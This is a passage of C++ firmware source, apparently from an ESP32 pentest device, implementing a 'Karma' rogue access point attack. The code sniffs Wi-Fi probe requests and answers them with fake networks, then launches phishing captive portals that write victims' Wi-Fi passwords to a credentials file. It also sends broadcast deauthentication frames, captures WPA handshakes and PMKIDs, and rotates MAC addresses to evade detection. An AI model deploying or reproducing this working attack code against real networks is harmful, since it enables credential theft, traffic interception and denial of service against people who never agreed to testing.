    const uint8_t *frame = pkt->payload;
    uint8_t frameSubType = (frame[0] & 0xF0) >> 4;

    if (frameSubType == 0x00 && karmaConfig.enableDeauth) {
        String clientMAC = extractMAC(pkt);
        sendDeauth(clientMAC, pgm_read_byte(&karma_channels[channl % 14]), false);
        assocBlocked++;
    }

    if (isEAPOL(pkt) && handshakeCaptureEnabled) {
        HandshakeCapture hs;
        memcpy(hs.bssid, frame + 16, 6);
        hs.ssid = "UNKNOWN";
        hs.channel = pgm_read_byte(&karma_channels[channl % 14]);
        hs.timestamp = millis();
        hs.frameLen = pkt->rx_ctrl.sig_len;
        if (hs.frameLen > 256) hs.frameLen = 256;
        memcpy(hs.eapolFrame, pkt->payload, hs.frameLen);
        hs.messageType = classifyEAPOLMessage(pkt);
        hs.keyInfo = 0;
        hs.isValid = hs.messageType > 0;
        hs.complete = (hs.messageType == 4);
        
        if (hs.isValid) {
            handshakeBuffer.push_back(hs);
            if (handshakeBuffer.size() > 20) handshakeBuffer.erase(handshakeBuffer.begin());
            if (hs.complete) saveHandshakeToFile(hs);
        }
    }

    if (!isProbeRequestWithSSID(pkt)) return;

    String mac = extractMAC(pkt);
    String ssid = extractSSID(pkt);
    if (mac.isEmpty()) return;

    uint32_t fingerprint = generateClientFingerprint(frame, pkt->rx_ctrl.sig_len);

    String cacheKey = mac + ":" + String(fingerprint);
    if (isMACInCache(cacheKey)) return;
    addMACToCache(cacheKey);

    RSNInfo rsn = extractRSNInfo(pkt->payload, pkt->rx_ctrl.sig_len);
    bool hasRSNInfo = (rsn.akmSuite > 0 || rsn.pairwiseCipher > 0);

    ProbeRequest probe = {};
    copyStringToBuffer(probe.mac, sizeof(probe.mac), mac);
    copyStringToBuffer(probe.ssid, sizeof(probe.ssid), ssid);
    probe.rssi = ctrl.rssi;
    probe.timestamp = millis();
    probe.channel = pgm_read_byte(&karma_channels[channl % 14]);
    probe.fingerprint = fingerprint;
    probe.frame = nullptr;
    probe.isPMKID = isPMKIDValid(frame, pkt->rx_ctrl.sig_len);

    if (hasRSNInfo || probe.isPMKID) {
        probe.frame_len = std::min((uint16_t)pkt->rx_ctrl.sig_len, (uint16_t)PROBE_FRAME_CAPTURE_LEN);
        probe.frame = (uint8_t *)malloc(probe.frame_len);
        if (probe.frame != nullptr) memcpy(probe.frame, pkt->payload, probe.frame_len);
        else probe.frame_len = 0;
        if (probe.isPMKID) pmkidCaptured++;
    } else {
        probe.frame_len = 0;
    }

    freeProbeFrame(probeBuffer[probeBufferIndex]);
    probeBuffer[probeBufferIndex] = probe;
    probeBufferIndex = (probeBufferIndex + 1) % MAX_PROBE_BUFFER;
    if (probeBufferIndex == 0) bufferWrapped = true;

    totalProbes++;
    pkt_counter++;

    if (karmaQueue) {
        QueuedProbeEvent event = {};
        copyStringToBuffer(event.mac, sizeof(event.mac), mac);
        copyStringToBuffer(event.ssid, sizeof(event.ssid), ssid);
        event.rssi = probe.rssi;
        event.timestamp = probe.timestamp;
        event.channel = probe.channel;
        event.fingerprint = probe.fingerprint;
        event.rsn = rsn;
        event.isPMKID = probe.isPMKID;
        xQueueSend(karmaQueue, &event, 0);
    }
}

// ============================================================
// Clear Probes
// ============================================================

void clearProbes() {
    probeBufferIndex = 0;
    bufferWrapped = false;
    totalProbes = 0;
    uniqueClients = 0;
    pkt_counter = 0;
    karmaResponsesSent = 0;
    deauthPacketsSent = 0;
    autoPortalsLaunched = 0;
    cloneAttacksLaunched = 0;
    beaconsSent = 0;
    pendingPortals.clear();
    activeNetworks.clear();
    ssidFrequency.clear();
    popularSSIDs.clear();
    networkHistory.clear();
    macBlacklist.clear();
    pmkidCaptured = 0;
    assocBlocked = 0;
    handshakeBuffer.clear();
    memset(channelActivity, 0, sizeof(channelActivity));

    clientBehaviors.clear();

    destroyActivePortal();

    while (!responseQueue.empty()) responseQueue.pop();
    if (macRingBuffer) {
        vRingbufferDelete(macRingBuffer);
        initMACCache();
    }
    for (int i = 0; i < MAX_PROBE_BUFFER; i++) {
        freeProbeFrame(probeBuffer[i]);
        probeBuffer[i].mac[0] = '\0';
        probeBuffer[i].ssid[0] = '\0';
    }
    targetRateLimit.clear();
    lastRateLimitReset = 0;
}

// ============================================================
// Get Unique Probes
// ============================================================

std::vector<ProbeRequest> getUniqueProbes() {
    std::vector<ProbeRequest> unique;
    std::set<String> seen;
    int start = bufferWrapped ? probeBufferIndex : 0;
    int count = bufferWrapped ? MAX_PROBE_BUFFER : probeBufferIndex;
    count = std::min(count, 30);
    for (int i = 0; i < count; i++) {
        int idx = (start + i) % MAX_PROBE_BUFFER;
        const ProbeRequest &probe = probeBuffer[idx];
        if (probeSSIDEmpty(probe) || probeSSIDEquals(probe, "*WILDCARD*")) continue;
        String key = String(probe.fingerprint) + ":" + String(probe.ssid);
        if (seen.find(key) == seen.end()) {
            seen.insert(key);
            ProbeRequest copy = probe;
            copy.frame = nullptr;
            copy.frame_len = 0;
            unique.push_back(copy);
            if (unique.size() >= 15) break;
        }
    }
    return unique;
}

std::vector<ClientBehavior> getVulnerableClients() {
    std::vector<ClientBehavior> vulnerable;
    size_t count = 0;
    for (const auto &pair : clientBehaviors) {
        if (pair.second.isVulnerable && !pair.second.probedSSIDs.empty()) {
            vulnerable.push_back(pair.second);
            if (++count >= 15) break;
        }
    }
    std::sort(vulnerable.begin(), vulnerable.end(),
        [](const ClientBehavior& a, const ClientBehavior& b) {
            return a.priorityScore > b.priorityScore;
        });
    return vulnerable;
}

// ============================================================
// Update Display
// ============================================================

void updateKarmaDisplay() {
    unsigned long currentTime = millis();
    if (currentTime - last_time > 1000) {
        last_time = currentTime;

        tft.fillRect(
            BORDER_PAD_X, BORDER_PAD_Y, tftWidth - 2 * BORDER_PAD_X, tftHeight - BORDER_PAD_Y - 25,
            bruceConfig.bgColor
        );
        tft.setTextSize(FP);
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);

        int y = BORDER_PAD_Y;
        tft.setCursor(BORDER_PAD_X, y);

        if (karmaPaused) {
            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.setCursor(BORDER_PAD_X, y);
            tft.print("KARMA PAUSED");
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            y += LH + 2;
        }

        padprint("Total:" + String(totalProbes));
        padprint("Uniq:" + String(uniqueClients), 7);
        padprint("Act:" + String(activeNetworks.size()), 13);
        padprintln("Pend:" + String(pendingPortals.size()), 19);

        padprint("Queue:" + String(responseQueue.size()));
        padprint("Beac:" + String(beaconsSent), 7);
        padprint("Karma:" + String(karmaResponsesSent), 13);
        padprintln("Clone:" + String(cloneAttacksLaunched), 19);

        padprint("Port:" + String(autoPortalsLaunched) + "/" + String(activePortalCount()));
        padprint("HS:" + String(handshakeBuffer.size()), 10);
        padprintln("PMKID:" + String(pmkidCaptured), 16);

        padprint("Ch:" + String(pgm_read_byte(&karma_channels[channl % 14])));
        String hopStatus = String(auto_hopping ? "Auto:" : "Man:") + String(hop_interval) + "ms";
        padprintln(hopStatus, 7);

        char macStr[18];
        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                currentBSSID[0], currentBSSID[1], currentBSSID[2],
                currentBSSID[3], currentBSSID[4], currentBSSID[5]);
        padprint("MAC:" + String(macStr));

        String modeText = "";
        switch (karmaMode) {
            case MODE_PASSIVE: modeText = "PASSIVE"; break;
            case MODE_BROADCAST: modeText = "BROADCAST"; break;
            case MODE_FULL: modeText = "FULL"; break;
            default: modeText = "PASSIVE"; break;
        }
        padprintln(modeText, 3);

        if (templateSelected && !selectedTemplate.name.isEmpty()) {
            String templateText = "Template:" + selectedTemplate.name;
            if (templateText.length() > 40) templateText = templateText.substring(0, 37) + "...";
            padprintln(templateText);
        }

        if (activePortal != nullptr) {
            unsigned long portalAge = currentTime - activePortal->launchTime;
            unsigned long portalLeftMs = (portalAge >= PORTAL_MAX_IDLE) ? 0 : (PORTAL_MAX_IDLE - portalAge);
            unsigned long portalLeftSec = portalLeftMs / 1000;

            String portalText = "Active Portal: " + activePortal->ssid;
            if (activePortal->targetEngaged) portalText += " *ENGAGED*";
            padprintln(portalText + "(" + String(portalLeftSec) + "s)");
            
            if (activePortal->pageViewCount > 0) {
                padprintln("Views: " + String(activePortal->pageViewCount));
            }
        }

        if (broadcastAttack.isActive()) {
            padprintln("Broadcast:" + broadcastAttack.getProgressString());
        } else {
            padprintln("");
        }

        tft.setCursor(BORDER_PAD_X, tftHeight - BORDER_PAD_Y - LH * FP);
        tft.print("SEL/ESC:Menu | Prev/Next:Channel");
    }
}

// ============================================================
// Save Functions
// ============================================================

void saveProbesToFile(FS &fs, bool compressed) {
    if (!storageAvailable) return;
    if (!fs.exists("/ProbeData")) fs.mkdir("/ProbeData");
    if (compressed) {
        File file = fs.open(filen, FILE_WRITE);
        if (file) {
            file.write('K');
            file.write('R');
            file.write('M');
            file.write(0x03);
            int count = bufferWrapped ? MAX_PROBE_BUFFER : probeBufferIndex;
            count = std::min(count, 200);
            uint16_t count16 = (uint16_t)count;
            file.write((uint8_t *)&count16, 2);
            for (int i = 0; i < count; i++) {
                int idx = bufferWrapped ? (probeBufferIndex + i) % MAX_PROBE_BUFFER : i;
                const ProbeRequest &probe = probeBuffer[idx];
                if (probeSSIDEmpty(probe) || probeSSIDEquals(probe, "*WILDCARD*")) continue;
                uint32_t timestamp = probe.timestamp;
                file.write((uint8_t *)&timestamp, 4);
                file.write((uint8_t *)probe.mac, 17);
                int8_t rssi = (int8_t)probe.rssi;
                file.write((uint8_t *)&rssi, 1);
                file.write((uint8_t *)&probe.channel, 1);
                uint8_t ssidLen = (uint8_t)strlen(probe.ssid);
                file.write(&ssidLen, 1);
                if (ssidLen > 0 && !probeSSIDEquals(probe, "*HIDDEN*"))
                    file.write((uint8_t *)probe.ssid, ssidLen);
                uint8_t flags = 0;
                if (probe.isPMKID) flags |= 0x01;
                file.write(&flags, 1);
            }
            file.close();
        }
    } else {
        File file = fs.open(filen, FILE_WRITE);
        if (file) {
            file.println("Timestamp,MAC,RSSI,Channel,SSID,PMKID");
            int count = bufferWrapped ? MAX_PROBE_BUFFER : probeBufferIndex;
            count = std::min(count, 200);
            for (int i = 0; i < count; i++) {
                int idx = bufferWrapped ? (probeBufferIndex + i) % MAX_PROBE_BUFFER : i;
                const ProbeRequest &probe = probeBuffer[idx];
                if (!probeSSIDEmpty(probe) && !probeSSIDEquals(probe, "*WILDCARD*")) {
                    file.printf("%lu,%s,%d,%d,\"%s\",%s\n",
                               probe.timestamp, probe.mac, probe.rssi, probe.channel,
                               probe.ssid, probe.isPMKID ? "YES" : "NO");
                }
            }
            file.close();
        }
    }
}

void saveProbesToPCAP(FS &fs) {
    if (!storageAvailable) return;
    String filename = "/ProbeData/karma_capture_" + String(millis()) + ".pcap";
    File file = fs.open(filename, FILE_WRITE);
    if (!file) {
        Serial.println("[PCAP] Failed to create file");
        return;
    }

    uint32_t magic = 0xa1b2c3d4;
    uint16_t version_major = 2;
    uint16_t version_minor = 4;
    int32_t thiszone = 0;
    uint32_t sigfigs = 0;
    uint32_t snaplen = 65535;
    uint32_t network = 105;

    file.write((uint8_t *)&magic, 4);
    file.write((uint8_t *)&version_major, 2);
    file.write((uint8_t *)&version_minor, 2);
    file.write((uint8_t *)&thiszone, 4);
    file.write((uint8_t *)&sigfigs, 4);
    file.write((uint8_t *)&snaplen, 4);
    file.write((uint8_t *)&network, 4);

    int written = 0;
    for (int i = 0; i < MAX_PROBE_BUFFER && written < 50; i++) {
        int idx = bufferWrapped ? (probeBufferIndex + i) % MAX_PROBE_BUFFER : i;
        const ProbeRequest &probe = probeBuffer[idx];

        if (probe.frame_len == 0 || probe.frame == nullptr) continue;

        uint32_t ts_sec = probe.timestamp / 1000;
        uint32_t ts_usec = (probe.timestamp % 1000) * 1000;

        file.write((uint8_t *)&ts_sec, 4);
        file.write((uint8_t *)&ts_usec, 4);
        file.write((uint8_t *)&probe.frame_len, 4);
        file.write((uint8_t *)&probe.frame_len, 4);
        file.write(probe.frame, probe.frame_len);
        written++;
    }

    file.close();

    if (written > 0) {
        Serial.printf("[PCAP] Saved %d probe requests to %s\n", written, filename.c_str());
        displayTextLine("PCAP: " + String(written) + " packets");
    } else {
        Serial.println("[PCAP] No probe frames to save");
        displayTextLine("No probe frames captured");
    }
    delay(1000);
}

void saveHandshakeToFile(const HandshakeCapture &hs) {
    FS *fs = nullptr;
    if (!getFsStorage(fs)) return;

    if (!fs->exists("/BrucePCAP/handshakes")) { fs->mkdir("/BrucePCAP/handshakes"); }

    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X%02X%02X%02X%02X%02X",
            hs.bssid[0], hs.bssid[1], hs.bssid[2], hs.bssid[3], hs.bssid[4], hs.bssid[5]);

    String filename = "/BrucePCAP/handshakes/HS_" + String(macStr) + "_" + hs.ssid + ".pcap";
    filename.replace(" ", "_");
    filename.replace("*", "");

    File file = fs->open(filename, FILE_APPEND);
    if (file) {
        uint32_t ts_sec = hs.timestamp / 1000;
        uint32_t ts_usec = (hs.timestamp % 1000) * 1000;
        file.write((uint8_t *)&ts_sec, 4);
        file.write((uint8_t *)&ts_usec, 4);
        uint32_t len = hs.frameLen;
        file.write((uint8_t *)&len, 4);
        file.write((uint8_t *)&len, 4);
        file.write(hs.eapolFrame, hs.frameLen);
        file.close();
    }
}

void saveNetworkHistory(FS &fs) {
    if (!storageAvailable) return;
    if (!fs.exists("/ProbeData")) fs.mkdir("/ProbeData");
    String filename = "/ProbeData/network_history_" + String(millis()) + ".csv";
    File file = fs.open(filename, FILE_WRITE);
    if (file) {
        file.println("SSID,ResponsesSent,SuccessfulConnections,LastResponse,SuccessRate,Failures");
        size_t count = 0;
        for (const auto &history : networkHistory) {
            file.printf("\"%s\",%lu,%lu,%lu,%d,%d\n",
                       history.first.c_str(),
                       history.second.responsesSent,
                       history.second.successfulConnections,
                       history.second.lastResponse,
                       history.second.successRate,
                       history.second.failureCount);
            if (++count >= 20) break;
        }
        file.close();
    }
}

void saveCredentialsToFile(const String &ssid, const String &password) {
    FS *saveFs = nullptr;
    if (!getFsStorage(saveFs)) return;
    String filename = "/ProbeData/credentials.txt";
    if (!saveFs->exists(filename)) {
        File initFile = saveFs->open(filename, FILE_WRITE);
        if (initFile) {
            initFile.println("=== CAPTURED CREDENTIALS ===");
            initFile.println("Timestamp,SSID,Password");
            initFile.close();
        }
    }
    File file = saveFs->open(filename, FILE_APPEND);
    if (file) {
        file.printf("%lu,\"%s\",\"%s\"\n", millis(), ssid.c_str(), password.c_str());
        file.close();
    }
}

// ============================================================
// Multi-Device Sync
// ============================================================

void syncMultiDeviceState() {
    unsigned long now = millis();
    if (now - syncState.lastSync < SYNC_INTERVAL) return;
    
    syncState.lastSync = now;
    
    syncState.activePortals.clear();
    if (activePortal != nullptr) {
        syncState.activePortals.push_back(activePortal->ssid);
    }
    
    for (const auto &client : clientBehaviors) {
        if (client.second.isPermanentTarget && client.second.successRate > 70.0f) {
            syncState.globalTargets[String(client.second.fingerprint)] = millis();
        }
    }
    
    for (auto it = syncState.globalTargets.begin(); it != syncState.globalTargets.end();) {
        if (now - it->second > 3600000) {
            it = syncState.globalTargets.erase(it);
        } else {
            ++it;
        }
    }
}

// ============================================================
// Main Karma Setup
// ============================================================

void karma_setup() {
    if (!ensureKarmaState()) {
        displayError("Karma alloc failed", true);
        return;
    }

    wifi_mode_t mode;
    esp_err_t err = esp_wifi_get_mode(&mode);

    if (err == ESP_ERR_WIFI_NOT_INIT) {
        drawMainBorderWithTitle("ENHANCED KARMA ATK");
        displayTextLine("Starting WiFi...");
        delay(500);

        WiFi.mode(WIFI_MODE_APSTA);
        delay(100);

        displayTextLine("WiFi started!");
        delay(500);
    } else if (err == ESP_OK) {
        drawMainBorderWithTitle("ENHANCED KARMA ATK");
        displayTextLine("WiFi ready");
        delay(500);
    }

    cleanlyStopWebUiForWiFiFeature();
    static bool isInitialized = false;
    if (isInitialized) {
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(nullptr);
        delay(100);
        isInitialized = false;
    }
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_set_promiscuous(false);

    forceFullRedraw();

    returnToMenu = false;
    isPortalActive = false;
    restartKarmaAfterPortal = false;
    templateSelected = false;
    karmaPaused = false;
    probeBufferIndex = 0;
    bufferWrapped = false;
    beaconsSent = 0;
    pmkidCaptured = 0;
    assocBlocked = 0;
    templateRotationIndex = 0;
    lastTemplateRotation = 0;
    lastRateLimitReset = 0;

    for (int i = 0; i < MAX_PROBE_BUFFER; i++) {
        freeProbeFrame(probeBuffer[i]);
        probeBuffer[i].mac[0] = '\0';
        probeBuffer[i].ssid[0] = '\0';
    }

    if (macRingBuffer) vRingbufferDelete(macRingBuffer);
    initMACCache();
    pendingPortals.clear();
    activeNetworks.clear();
    clientBehaviors.clear();
    ssidFrequency.clear();
    popularSSIDs.clear();
    networkHistory.clear();
    macBlacklist.clear();
    handshakeBuffer.clear();
    targetRateLimit.clear();

    destroyActivePortal();

    while (!responseQueue.empty()) responseQueue.pop();
    generateRandomBSSID(currentBSSID);
    lastMACRotation = millis();

    karmaMode = MODE_PASSIVE;

    drawMainBorderWithTitle("MODERN KARMA ATTACK");
    displayTextLine("Enhanced Karma v4.0");
    delay(500);

    if (!selectPortalTemplate(true)) {
        drawMainBorderWithTitle("KARMA SETUP");
        displayTextLine("Starting without portal...");
        delay(1000);
    }

    drawMainBorderWithTitle("ENHANCED KARMA ATK");
    FS *Fs = nullptr;
    String FileSys = "LittleFS";
    if (getFsStorage(Fs)) {
        FileSys = (Fs == &SD) ? "SD" : "LittleFS";
        is_LittleFS = (Fs == &LittleFS);
        filen = generateUniqueFilename(*Fs, false);
        storageAvailable = true;
    } else {
        Fs = &LittleFS;
        FileSys = "LittleFS";
        is_LittleFS = true;
        filen = generateUniqueFilename(LittleFS, false);
        storageAvailable = checkLittleFsSizeNM();
    }
    if (storageAvailable && !Fs->exists("/ProbeData")) Fs->mkdir("/ProbeData");

    forceFullRedraw();
    drawMainBorderWithTitle("ENHANCED KARMA ATK");
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    padprintln("Saved to " + FileSys);
    padprintln("Modern Karma v4.0 Started");

    clearProbes();

    karmaQueue = xQueueCreate(KARMA_QUEUE_DEPTH, sizeof(QueuedProbeEvent));

    // ENHANCED CONFIGURATION
    karmaConfig.enableAutoKarma = true;
    karmaConfig.enableDeauth = false;
    karmaConfig.enableSmartHop = true;
    karmaConfig.prioritizeVulnerable = true;
    karmaConfig.enableAutoPortal = templateSelected;
    karmaConfig.maxClients = MAX_CLIENT_TRACK;
    karmaConfig.rateLimitPerTarget = 10;
    karmaConfig.rateLimitWindow = RATE_LIMIT_WINDOW;
    karmaConfig.enableDetectionEvasion = true;
    karmaConfig.beaconJitterPercent = 20;
    karmaConfig.enablePermanentTargets = true;
    karmaConfig.permanentThreshold = PERMANENT_TARGET_THRESHOLD;

    attackConfig.defaultTier = TIER_HIGH;
    attackConfig.enableCloneMode = true;
    attackConfig.enableTieredAttack = true;
    attackConfig.priorityThreshold = 30;
    attackConfig.cloneThreshold = 3;
    attackConfig.enableBeaconing = false;
    attackConfig.highTierDuration = 180000;
    attackConfig.mediumTierDuration = 45000;
    attackConfig.fastTierDuration = 20000;
    attackConfig.cloneDuration = 90000;
    attackConfig.maxCloneNetworks = 3;
    attackConfig.baseDuration = 15000;
    attackConfig.extendedDuration = 180000;
    attackConfig.enableTemplateABTesting = true;
    attackConfig.templateRotationInterval = 5;
    attackConfig.enableContextualTemplate = true;

    handshakeCaptureEnabled = false;

    ensureWifiPlatform();
    if (!ensureKarmaApInterface(pgm_read_byte(&karma_channels[channl % 14]))) {
        releaseKarmaState();
        displayError("Fail starting AP", true);
        return;
    }

    wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(probe_sniffer);
    wifi_second_chan_t secondCh = WIFI_SECOND_CHAN_NONE;
    esp_wifi_set_channel(pgm_read_byte(&karma_channels[channl % 14]), secondCh);
    isInitialized = true;
    vTaskDelay(1000 / portTICK_RATE_MS);
    screenNeedsRedraw = true;

    for (;;) {
        if (restartKarmaAfterPortal) {
            restartKarmaAfterPortal = false;
            activePortalChannel = 0;
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(probe_sniffer);
            auto_hopping = true;
            esp_wifi_set_channel(pgm_read_byte(&karma_channels[channl % 14]), secondCh);
            screenNeedsRedraw = true;
        }
        if (returnToMenu) {
            esp_wifi_set_promiscuous(false);
            esp_wifi_set_promiscuous_rx_cb(nullptr);

            destroyActivePortal();

            while (!responseQueue.empty()) responseQueue.pop();
            if (macRingBuffer) {
                vRingbufferDelete(macRingBuffer);
                macRingBuffer = NULL;
            }
            if (karmaQueue) {
                vQueueDelete(karmaQueue);
                karmaQueue = nullptr;
            }

            vTaskDelay(50 / portTICK_PERIOD_MS);
            releaseKarmaState();
            return;
        }
        unsigned long currentTime = millis();
        if (is_LittleFS) { storageAvailable = checkLittleFsSizeNM(); }
        rotateBSSID();
        if (karmaConfig.enableSmartHop && !karmaPaused) smartChannelHop();
        if (karmaConfig.enableDeauth && (currentTime - lastDeauthTime > DEAUTH_INTERVAL) && !karmaPaused) {
            sendDeauth("FF:FF:FF:FF:FF:FF", pgm_read_byte(&karma_channels[channl % 14]), true);
            lastDeauthTime = currentTime;
        }
        if (attackConfig.enableBeaconing && !karmaPaused) sendBeaconFrames();
        if (!karmaPaused) {
            processQueuedProbeEvents();
            processResponseQueue();
            checkCloneAttackOpportunities();
            checkPendingPortals();
            checkForAssociations();
            checkPortals();
            syncMultiDeviceState();
            
            if (currentTime % 60000 < 1000) {
                for (auto &clientPair : clientBehaviors) {
                    if (clientPair.second.isVulnerable && 
                        clientPair.second.probeCount >= karmaConfig.permanentThreshold) {
                        handlePermanentTarget(clientPair.second);
                    }
                }
            }
        }
        if (broadcastAttack.isActive() && (karmaMode == MODE_BROADCAST || karmaMode == MODE_FULL) &&
            !karmaPaused) {
            broadcastAttack.update();
        }

        if (check(NextPress)) {
            if (!karmaPaused) esp_wifi_set_promiscuous(false);
            channl++;
            if (channl >= 14) channl = 0;
            setChannelWithSecond(pgm_read_byte(&karma_channels[channl % 14]));
            screenNeedsRedraw = true;
            if (!karmaPaused) {
                vTaskDelay(50 / portTICK_RATE_MS);
                esp_wifi_set_promiscuous(true);
            }
        }

        if (check(PrevPress)) {
            if (!karmaPaused) esp_wifi_set_promiscuous(false);
            if (channl == 0) channl = 13;
            else channl--;
            setChannelWithSecond(pgm_read_byte(&karma_channels[channl % 14]));
            screenNeedsRedraw = true;
            if (!karmaPaused) {
                vTaskDelay(50 / portTICK_PERIOD_MS);
                esp_wifi_set_promiscuous(true);
            }
        }

        // ──────────────────────────────────────────
        // FALLBACK AP CLIENT DETECTION
        // ──────────────────────────────────────────
        static unsigned long lastClientCheck = 0;
        if (millis() - lastClientCheck > 2000) {
            lastClientCheck = millis();
            
            // Only trigger if:
            // 1. We're in AP mode
            // 2. A client is connected
            // 3. No portal is already active
            // 4. We have a template selected
            if (isApModeActive() && 
                WiFi.softAPgetStationNum() > 0 && 
                !isPortalActive &&
                templateSelected) {
                
                Serial.printf("[KARMA] Client connected to fallback AP! Launching portal for %s\n", 
                             KARMA_FALLBACK_SSID);
                
                // Use currently selected template
                launchBackgroundPortal(
                    KARMA_FALLBACK_SSID,
                    pgm_read_byte(&karma_channels[channl % 14]),
                    selectedTemplate.name,
                    selectedTemplate.filename
                );
            }
        }

        if (check(SelPress) || check(EscPress)) {
            check(SelPress);
            check(EscPress);

            vTaskDelay(200 / portTICK_PERIOD_MS);

            std::vector<Option> options = {
                {"Enhanced Stats", [&]() {
                     drawMainBorderWithTitle("ADVANCED STATS");
                     int y = BORDER_PAD_Y;
                     tft.setTextSize(FP);
                     tft.setCursor(BORDER_PAD_X, y);
                     padprint("Total: " + String(totalProbes));
                     padprintln("Unique: " + String(uniqueClients), 10);
                     padprint("Karma: " + String(karmaResponsesSent));
                     padprintln("Beacons: " + String(beaconsSent), 10);
                     padprint("Active: " + String(activeNetworks.size()));
                     padprintln("Pending: " + String(pendingPortals.size()), 10);
                     padprint("Portals: " + String(activePortalCount()));
                     padprintln("Blacklist: " + String(macBlacklist.size()), 10);
                     padprint("PMKID: " + String(pmkidCaptured));
                     padprintln("Handshakes: " + String(handshakeBuffer.size()), 10);
                     padprint("Success Rate: ");
                     float avgRate = 0;
                     int rateCount = 0;
                     for (const auto &client : clientBehaviors) {
                         if (client.second.successRate > 0) {
                             avgRate += client.second.successRate;
                             rateCount++;
                         }
                     }
                     if (rateCount > 0) avgRate /= rateCount;
                     padprintln(String(avgRate, 1) + "%", 10);
                     padprint("Permanent: ");
                     int permCount = 0;
                     for (const auto &client : clientBehaviors) {
                         if (client.second.isPermanentTarget) permCount++;
                     }
                     padprintln(String(permCount), 10);
                     padprintln("Sel: Back");
                     while (!check(SelPress) && !check(EscPress)) {
                         if (check(PrevPress)) break;
                         delay(50);
                     }
                     screenNeedsRedraw = true;
                 }},
                {karmaPaused ? "Resume Karma" : "Pause Karma", [&]() {
                     karmaPaused = !karmaPaused;
                     if (karmaPaused) {
                         esp_wifi_set_promiscuous(false);
                         displayTextLine("Karma PAUSED");
                     } else {
                         esp_wifi_set_promiscuous(true);
                         displayTextLine("Karma RESUMED");
                     }
                     delay(1000);
                     screenNeedsRedraw = true;
                 }},
                {"Rotate MAC Now", [&]() {
                     generateRandomBSSID(currentBSSID);
                     lastMACRotation = millis();
                     displayTextLine("MAC rotated");
                     delay(1000);
                     screenNeedsRedraw = true;
                 }},
                {"Set Mode", [&]() {
                     std::vector<Option> modeOptions = {
                         {"Passive (Listen only)", [&]() {
                              karmaMode = MODE_PASSIVE;
                              broadcastAttack.stop();
                              attackConfig.enableBeaconing = false;
                              displayTextLine("Passive mode");
                              delay(1000);
                          }},
                         {"Broadcast (Advertise SSIDs)", [&]() {
                              karmaMode = MODE_BROADCAST;
                              if (!karmaPaused) {
                                  broadcastAttack.start();
                                  attackConfig.enableBeaconing = true;
                              }
                              displayTextLine("Broadcast mode");
                              delay(1000);
                          }},
                         {"Full (Both)", [&]() {
                              karmaMode = MODE_FULL;
                              if (!karmaPaused) {
                                  broadcastAttack.start();
                                  attackConfig.enableBeaconing = true;
                              }
                              displayTextLine("Full mode");
                              delay(1000);
                          }},
                         {"Back", [&]() {}}
                     };
                     loopOptions(modeOptions);
                     screenNeedsRedraw = true;
                 }},
                {"Channel Control", [&]() {
                     std::vector<Option> channelOptions = {
                         {"Next Channel", [&]() {
                              if (!karmaPaused) esp_wifi_set_promiscuous(false);
                              channl++;
                              if (channl >= 14) channl = 0;
                              setChannelWithSecond(pgm_read_byte(&karma_channels[channl % 14]));
                              screenNeedsRedraw = true;
                              if (!karmaPaused) esp_wifi_set_promiscuous(true);
                              displayTextLine("Channel: " + String(karma_channels[channl % 14]));
                              delay(1000);
                          }},
                         {"Previous Channel", [&]() {
                              if (!karmaPaused) esp_wifi_set_promiscuous(false);
                              if (channl == 0) channl = 13;
                              else channl--;
                              setChannelWithSecond(pgm_read_byte(&karma_channels[channl % 14]));
                              screenNeedsRedraw = true;
                              if (!karmaPaused) esp_wifi_set_promiscuous(true);
                              displayTextLine("Channel: " + String(karma_channels[channl % 14]));
                              delay(1000);
                          }},
                         {"Auto Hop ON/OFF", [&]() {
                              auto_hopping = !auto_hopping;
                              displayTextLine(auto_hopping ? "Auto Hop ON" : "Auto Hop OFF");
                              delay(1000);
                          }},
                         {"Set Interval", [&]() {
                              std::vector<Option> intervalOptions = {
                                  {"500ms", [&]() { hop_interval = 500; }},
                                  {"1000ms", [&]() { hop_interval = 1000; }},
                                  {"2000ms", [&]() { hop_interval = 2000; }},
                                  {"3000ms", [&]() { hop_interval = 3000; }},
                                  {"Back", [&]() {}}
                              };
                              loopOptions(intervalOptions);
                          }},
                         {"Back", [&]() {}}
                     };
                     loopOptions(channelOptions);
                 }},
                {"Attack Settings", [&]() {
                     std::vector<Option> attackOptions = {
                         {karmaConfig.enableAutoKarma ? "* Auto Karma" : "- Auto Karma", [&]() {
                              karmaConfig.enableAutoKarma = !karmaConfig.enableAutoKarma;
                              displayTextLine(karmaConfig.enableAutoKarma ? "Auto Karma ON" : "Auto Karma OFF");
                              delay(1000);
                          }},
                         {karmaConfig.enableAutoPortal ? "* Auto Portal" : "- Auto Portal", [&]() {
                              if (!templateSelected) {
                                  displayTextLine("Select template first!");
                                  delay(1000);
                                  return;
                              }
                              karmaConfig.enableAutoPortal = !karmaConfig.enableAutoPortal;
                              displayTextLine(karmaConfig.enableAutoPortal ? "Auto Portal ON" : "Auto Portal OFF");
                              delay(1000);
                          }},
                         {karmaConfig.enableDeauth ? "* Deauth" : "- Deauth", [&]() {
                              karmaConfig.enableDeauth = !karmaConfig.enableDeauth;
                              displayTextLine(karmaConfig.enableDeauth ? "Deauth ON" : "Deauth OFF");
                              delay(1000);
                          }},
                         {attackConfig.enableBeaconing ? "* Beaconing" : "- Beaconing", [&]() {
                              attackConfig.enableBeaconing = !attackConfig.enableBeaconing;
                              if (attackConfig.enableBeaconing && broadcastAttack.isActive()) {
                                  karmaMode = MODE_FULL;
                              } else if (attackConfig.enableBeaconing || broadcastAttack.isActive()) {
                                  karmaMode = MODE_BROADCAST;
                              } else {
                                  karmaMode = MODE_PASSIVE;
                              }
                              displayTextLine(attackConfig.enableBeaconing ? "Beaconing ON" : "Beaconing OFF");
